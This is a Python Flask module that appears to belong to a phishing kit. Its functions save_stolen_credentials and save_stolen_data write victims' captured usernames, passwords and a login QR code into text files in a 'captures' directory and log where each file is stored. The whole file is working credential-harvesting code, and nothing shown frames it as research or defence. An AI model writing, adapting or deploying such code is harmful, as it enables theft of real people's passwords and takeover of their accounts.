from pathlib import Path
from re import sub
from datetime import datetime, timezone
from flask import current_app
from ..flow import LoginFlow

def get_captures_dir() -> Path:
    """Returns the path to the captures directory"""
    return Path(current_app.root_path).parent / "captures"

def make_captures_dir() -> None:
    """Creates the captures directory if it doesn't exist"""
    get_captures_dir().mkdir(exist_ok=True)

def save_stolen_credentials(username: str, password: str) -> None:
    """Saves the stolen credentials to a text file in the captures directory"""
    try:
        make_captures_dir()

        safe_username = sub(r"[^a-zA-Z0-9._-]", "_", username)

        file_name = f"{safe_username}_credentials.txt"
        file = get_captures_dir() / file_name
        content = (
            f"Data acquired at: {datetime.now(timezone.utc)} (UTC)\n"
            f"Username: {username}\n"
            f"Password: {password}\n"
        )

        file.write_text(content, encoding="utf-8")

        current_app.logger.info(f"Stolen credentials saved to {file.resolve()}")

    except Exception:
        current_app.logger.exception(f"Failed to save stolen credentials")

def save_stolen_data(login_flow: LoginFlow) -> None:
    """Saves the stolen data to a text file in the captures directory"""
    try:
        make_captures_dir()

        safe_username = sub(r"[^a-zA-Z0-9._-]", "_", login_flow.username or "unknown")

        file_name = f"{safe_username}_data.txt"
        file = get_captures_dir() / file_name
        content = (
            f"Data acquired at: {datetime.now(timezone.utc)} (UTC)\n"
            f"Username: {login_flow.username}\n"
            f"Password: {login_flow.password}\n"
            f"QR Code: {login_flow.qr_code}\n"
        )

        file.write_text(content, encoding="utf-8")

        current_app.logger.info(f"Stolen data saved to {file.resolve()}")

    except Exception:
        current_app.logger.exception(f"Failed to save stolen data")
